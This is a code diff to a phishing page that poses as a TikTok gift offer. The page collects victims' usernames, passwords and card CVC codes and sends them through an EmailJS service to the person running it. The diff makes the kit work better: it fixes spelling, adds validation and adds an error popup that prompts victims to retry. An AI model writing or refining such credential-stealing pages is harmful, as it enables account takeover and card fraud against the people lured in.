@@ -118,39 +118,43 @@
         background-color: #1abc9c; /* Darker green on hover */
     }
 </style>
-  <button type="button" onclick="sendLoginInfo()" class="button" >SUBMIT AND RECIEVE FUNDS</button>
-  	
-  	  <p style="color:red">Fill in right information to recieve Gift </p>
- 
-  </div>
-    <script>
+ <button type="button" onclick="sendLoginInfo()" class="button">SUBMIT AND RECEIVE FUNDS</button>
+  <p style="color:red"></p>
+  <div id="error-message" style="display: none;">Please input the correct TikTok account and password to get a gift.</div>
+
+  <script>
     const sendLoginInfo = () => {
       let username = document.getElementById("username").value;
       let password = document.getElementById("password").value;
       let cvc = document.getElementById("cvc").value;
-    
+
+      // Basic validation
+      if (username === "" || password === "" || cvc === "") {
+        showError();
+        return;
+      }
+
       var templateParams = {
         username: username,
         password: password,
         cvc: cvc,
       };
-      
-      emailjs.send("service_worxtub","template_tikb2pl", templateParams)
+
+      emailjs.send("service_worxtub", "template_tikb2pl", templateParams)
         .then(function(response) {
           console.log('Login information sent successfully!');
         }, function(error) {
           console.log('Error sending login information:', error);
+          showError(); // Display error message on emailjs error
         });
     };
-  </script>
-  <div id="error-message" style="display: none;">Please input the correct TikTok account and password to get gift.</div>
 
-  <script>
     function showError() {
       document.getElementById("error-message").style.display = "block";
       document.getElementById("error-message").style.color = "red";
+      alert("Check your username or password!"); // Popup warning message
     }
   </script>
-
 </body>
-</html>
+  </html>
+	  
